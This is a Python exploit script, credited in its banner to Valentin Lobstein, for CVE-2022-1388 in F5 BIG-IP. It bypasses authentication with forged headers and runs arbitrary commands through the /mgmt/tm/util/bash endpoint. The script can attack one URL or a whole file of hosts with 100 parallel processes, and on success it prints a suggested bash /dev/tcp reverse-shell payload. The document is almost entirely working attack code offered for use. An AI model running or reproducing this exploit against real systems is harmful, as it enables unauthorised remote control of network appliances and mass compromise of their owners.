#!/usr/bin/python3.9
# -*- coding: utf-8 -*-


import sys
import json
import time
import urllib
import argparse
import requests
import concurrent.futures
from rich.console import Console
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

console = Console()

parser = argparse.ArgumentParser("F5 Big-IP RCE")
parser.add_argument('-u', '--url', type=str, help='Target URL')
parser.add_argument('-c', '--command', type=str, default="id", help='Command to execute on remote host ')
parser.add_argument('-f', '--file', type=str, help='Path to file containing target hosts')

args = parser.parse_args()


def title():
    console.print('''[bold yellow]
     _____  _   _  _____        _____  _____  _____  _____        __   _____  _____  _____ 
    /  __ \| | | ||  ___|      / __  \|  _  |/ __  \/ __  \      /  | |____ ||  _  ||  _  |
    | /  \/| | | || |__  ______`' / /'| |/' |`' / /'`' / /'______`| |     / / \ V /  \ V / 
    | |    | | | ||  __||______| / /  |  /| |  / /    / / |______|| |     \ \ / _ \  / _ \ 
    | \__/\\ \_/ /| |___       ./ /___\ |_/ /./ /___./ /___      _| |_.___/ /| |_| || |_| |
     \____/ \___/ \____/       \_____/ \___/ \_____/\_____/      \___/\____/ \_____ \_____/                                                                                                                                                                                                                                                          
                                                      
    ''')
    console.print('''[bold cyan]
    CVE-2022-1388 F5 Exploit [ Valentin Lobstein ]
    Usage:
            Exploit Host: python3 CVE_2022_1388.py -u target_url -c command 
            Exploit List: python3 CVE_2022_1388.py -f file -c command
            ( Command is not required )
        ''')

def format_url(url):
    try:
        if not '://' in url:
            url = 'https://' + url.strip()
        return url

    except Exception as e:
        console.print(f'URL Incorrect {url}')

def headers():
    headers = {
        "Host": "127.0.0.1",
        "User-Agent": "Connaissez vous le secret du jaaj ?",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'a',
        'Authorization': 'Basic YWRtaW46'
    }
    return headers


def exploit(target_url,silent=False):
    target_url = format_url(target_url)
    check_url = target_url + '/mgmt/tm/util/bash'
    data = {'command': "run", 'utilCmdArgs': f"-c \'{args.command}\'"}
    try:
        response = requests.post(url=check_url, json=data, headers=headers(), verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
           console.print("[bold yellow][?] Suggested payload : bash -i >&/dev/tcp/<IP>/<PORT> 0>&1\n")
           console.print(f"[bold green][+] Target {target_url} Vulnerable \n\n[bold yellow]Command result:\n\n [bold cyan]{response.json()['commandResult'].strip()}\n")
        else:
            if silent == True:
                console.print(f"[bold red][-] Target {target_url} Not Vulnerable")

    except Exception as e:
        if silent == True:
            console.print(f"[bold yellow][!] Can't connect to {target_url}")
        pass


def massexploit(file):
    try:
        with open(file , 'r') as f:
            links = f.readlines()
            with console.status("[bold red]",spinner="aesthetic") as status:
                executor = concurrent.futures.ProcessPoolExecutor(100)
                futures = [executor.submit(exploit, link) for link in links]
                concurrent.futures.wait(futures)

    except KeyboardInterrupt:
        console.print('[bold grey][+] Bye Bye !')
        sys.exit(1)





if __name__ == '__main__':
    title()
    if args.url and not args.file:
        exploit(args.url, True)
    elif args.file and not args.url:
        massexploit(args.file)
    else:
        sys.exit(0)
